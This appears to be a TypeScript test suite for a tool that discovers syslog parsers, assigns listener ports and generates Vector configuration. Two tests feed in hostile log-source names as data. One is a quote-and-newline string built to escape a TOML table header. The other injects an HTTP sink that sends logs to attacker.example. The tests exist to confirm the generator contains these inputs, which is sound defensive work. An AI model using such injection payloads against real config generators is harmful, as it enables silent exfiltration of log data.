import assert from "node:assert/strict";
import { test } from "node:test";
import { SYSLOG_CATALOG } from "./catalog.js";
import {
  buildCatalog,
  DISCOVERED_PORT_MAX,
  DISCOVERED_PORT_MIN,
  assignPort,
  findDevice,
  isSyslogCollectable,
  parseSourceSelectors,
  resolveRequested,
} from "./discovery.js";
import type { ParserContext } from "./parsers.js";
import { buildVectorToml } from "./syslog.js";
import type { LogSource, RepositoryParser } from "./types.js";

function ctxOf(deployed: LogSource[], repoParsers: RepositoryParser[] = []): ParserContext {
  return { ok: true, deployed, repoParsers, repoId: "repo-1" };
}

const MIKROTIK: LogSource = {
  id: "ls-1",
  name: "mikrotik_routeros",
  match_values: ["mikrotik_routeros", "routeros", "mikrotik"],
  deployed: true,
};

test("a deployed parser becomes a selectable source type", () => {
  const { catalog, discovered, fromInstance } = buildCatalog(ctxOf([MIKROTIK]));
  assert.equal(fromInstance, true);
  assert.equal(discovered.length, 1);
  assert.equal(discovered[0]!.sourceType, "mikrotik_routeros");
  assert.deepEqual(discovered[0]!.aliases, ["routeros", "mikrotik"]);
  assert.equal(catalog.length, SYSLOG_CATALOG.length + 1);
});

test("an alias resolves to the deployed parser's entry", () => {
  const { catalog } = buildCatalog(ctxOf([MIKROTIK]));
  // The whole point of NAN-2368: `--sources routeros` has to find the imported parser.
  assert.equal(findDevice(catalog, "routeros")?.sourceType, "mikrotik_routeros");
  assert.equal(findDevice(catalog, "MikroTik")?.sourceType, "mikrotik_routeros");
  assert.equal(findDevice(catalog, "nope"), undefined);
});

test("no connection (or a 403) degrades to the curated built-ins", () => {
  for (const ctx of [undefined, { ok: false, deployed: [], repoParsers: [] } as ParserContext]) {
    const { catalog, discovered, fromInstance } = buildCatalog(ctx);
    assert.equal(fromInstance, false);
    assert.equal(discovered.length, 0);
    assert.deepEqual(catalog, SYSLOG_CATALOG);
  }
});

test("discovered ports never collide with the curated ones, or each other", () => {
  const deployed: LogSource[] = Array.from({ length: 40 }, (_, i) => ({
    id: `ls-${i}`,
    name: `vendor_${i}`,
    deployed: true,
  }));
  const { catalog } = buildCatalog(ctxOf(deployed));
  const ports = catalog.map((d) => d.port);
  assert.equal(new Set(ports).size, ports.length, "every port is unique");
  for (const d of catalog.filter((x) => x.origin === "discovered")) {
    assert.ok(d.port >= DISCOVERED_PORT_MIN && d.port <= DISCOVERED_PORT_MAX);
  }
});

test("a source type keeps its port when unrelated parsers are added", () => {
  // Devices get pointed at a port. Importing another parser must not renumber that listener.
  const before = buildCatalog(ctxOf([MIKROTIK]));
  const after = buildCatalog(
    ctxOf([{ id: "ls-2", name: "aardvark_fw", deployed: true }, MIKROTIK, { id: "ls-3", name: "zebra_vpn", deployed: true }]),
  );
  assert.equal(
    findDevice(before.catalog, "routeros")!.port,
    findDevice(after.catalog, "routeros")!.port,
  );
});

test("a curated vendor keeps its vetted port even if a parser shares the name", () => {
  const { catalog, discovered } = buildCatalog(
    ctxOf([{ id: "ls-9", name: "cisco_asa", match_values: ["cisco_asa"], deployed: true }]),
  );
  assert.equal(discovered.length, 0, "curated entry wins, no shadow entry");
  assert.equal(findDevice(catalog, "cisco_asa")!.port, 5514);
});

test("undeployed log sources and unsafe names are skipped", () => {
  const { discovered } = buildCatalog(
    ctxOf([
      { id: "ls-4", name: "staged_thing", deployed: false },
      // Would break out of `[sources.<id>]` / `.source_type = "<x>"` if interpolated.
      { id: "ls-5", name: 'evil"]\nkey = "x', deployed: true },
    ]),
  );
  assert.deepEqual(discovered, []);
});

test("a hostile log source name can't inject config through the label", () => {
  // source_type is validated, but the NAME lands in a TOML comment — where a newline escapes it.
  const evil = '\n[sinks.exfil]\ntype = "http"\nuri = "http://attacker.example/x"\n#';
  const { discovered } = buildCatalog(
    ctxOf([{ id: "ls-6", name: evil, match_values: ["totally_fine"], deployed: true }]),
  );
  assert.equal(discovered.length, 1);
  assert.equal(discovered[0]!.sourceType, "totally_fine");
  assert.ok(!/[\n\r]/.test(discovered[0]!.label), "label is a single line");
  const toml = buildVectorToml(
    {
      catalog: discovered,
      selected: discovered,
      uplink: {
        transport: "native",
        target: { host: "h", port: 6000 },
        tls: { enabled: true },
        ingestUrl: "https://nano.example/ingest/",
      },
      bufferBytes: 1,
      image: "i",
    },
    "now",
  );
  // The label may still *mention* the payload — what matters is that it stays inside the comment
  // it was written into, so TOML never sees a table header.
  for (const line of toml.split("\n")) {
    if (line.includes("[sinks.exfil]")) {
      assert.ok(line.trimStart().startsWith("#"), `payload escaped its comment: ${line}`);
    }
  }
});

test("repeating a source type doesn't emit it twice", () => {
  // Duplicate [sources.x] blocks make Vector refuse to load the whole config.
  const ctx = ctxOf([], [
    { id: "p-2", name: "acme_fw", file_path: "acme.yaml", raw_content: "match_values:\n  - acme\n" },
  ]);
  const { catalog } = buildCatalog(ctx);
  const { selected } = resolveRequested(parseSourceSelectors("acme,acme,cisco_asa,cisco_asa"), catalog, ctx);
  assert.equal(new Set(selected.map((d) => d.id)).size, selected.length);
  assert.equal(selected.length, 2);
});

test("assignPort reports exhaustion instead of colliding", () => {
  const full = new Set(
    Array.from({ length: DISCOVERED_PORT_MAX - DISCOVERED_PORT_MIN + 1 }, (_, i) => DISCOVERED_PORT_MIN + i),
  );
  assert.equal(assignPort("anything", full), undefined);
});

test("--sources parses transport suffixes", () => {
  assert.deepEqual(parseSourceSelectors("cisco_asa, routeros:tcp ,pfsense:UDP"), [
    { id: "cisco_asa" },
    { id: "routeros", mode: "tcp" },
    { id: "pfsense", mode: "udp" },
  ]);
  assert.throws(() => parseSourceSelectors("routeros:sctp"), /Use ":udp" or ":tcp"/);
  assert.throws(() => parseSourceSelectors("a:b:c"), /Malformed/);
});

test("a transport override reaches the selected entry, not the catalog default", () => {
  const { catalog } = buildCatalog(ctxOf([MIKROTIK]));
  const { selected, unknown } = resolveRequested(parseSourceSelectors("pfsense:tcp,routeros"), catalog);
  assert.deepEqual(unknown, []);
  assert.equal(selected.find((d) => d.id === "pfsense")!.mode, "tcp");
  assert.equal(catalog.find((d) => d.id === "pfsense")!.mode, "udp", "catalog is not mutated");
});

test("an undeployed community parser is offered and requestable by name", () => {
  const ctx = ctxOf([], [
    {
      id: "p-1",
      name: "juniper_junos",
      display_name: "Juniper JunOS",
      file_path: "juniper.yaml",
      raw_content: "category: network\nmatch_values:\n  - junos\n",
    },
  ]);
  const { catalog, available } = buildCatalog(ctx);
  assert.deepEqual(available.map((c) => c.id), ["juniper_junos"]);
  const { selected, fromRepo, unknown } = resolveRequested(parseSourceSelectors("junos"), catalog, ctx);
  assert.deepEqual(unknown, []);
  assert.equal(fromRepo.length, 1);
  assert.equal(selected[0]!.sourceType, "junos");
});

test("a declared `transports:` decides collectability, overriding category", () => {
  // The authoritative signal: an API-only source in a syslog-ish category is still excluded...
  assert.equal(
    isSyslogCollectable({ id: "a", file_path: "a.yaml", raw_content: "category: network\ntransports: [api]\n" }),
    false,
  );
  // ...and a syslog source in a non-syslog category is still included.
  assert.equal(
    isSyslogCollectable({ id: "b", file_path: "b.yaml", raw_content: "category: cloud\ntransports:\n  - syslog\n  - api\n" }),
    true,
  );
});

test("without `transports:`, category decides — and an unknown category stays offerable", () => {
  const of = (raw: string) => isSyslogCollectable({ id: "x", file_path: "x.yaml", raw_content: raw });
  assert.equal(of("category: network\n"), true);
  assert.equal(of("category: security\n"), true);
  assert.equal(of("category: cloud\n"), false);
  assert.equal(of("category: endpoint\n"), false);
  assert.equal(of("category: application\n"), false);
  assert.equal(of("name: mystery\n"), true, "no category → permissive, not silently unofferable");
});

test("a source that can't arrive over syslog is refused, not silently generated", () => {
  const ctx = ctxOf([], [
    {
      id: "p-3",
      name: "aws_cloudtrail",
      file_path: "ct.yaml",
      raw_content: "category: cloud\nmatch_values:\n  - cloudtrail\n",
    },
  ]);
  const { catalog, available, omitted } = buildCatalog(ctx);
  assert.deepEqual(available, [], "not offered");
  assert.deepEqual(omitted, ["aws_cloudtrail"], "and named, so the listing can say why");
  const { selected, unknown, notSyslog } = resolveRequested(parseSourceSelectors("cloudtrail"), catalog, ctx);
  assert.deepEqual(selected, []);
  assert.deepEqual(unknown, [], "it's a known parser — refused, not 'never heard of it'");
  assert.equal(notSyslog[0]!.category, "cloud");
});

test("a source type nano has never heard of is rejected", () => {
  const { catalog } = buildCatalog(ctxOf([MIKROTIK]));
  const { unknown, selected } = resolveRequested(parseSourceSelectors("not_a_thing"), catalog, ctxOf([MIKROTIK]));
  assert.deepEqual(unknown, ["not_a_thing"]);
  assert.deepEqual(selected, []);
});
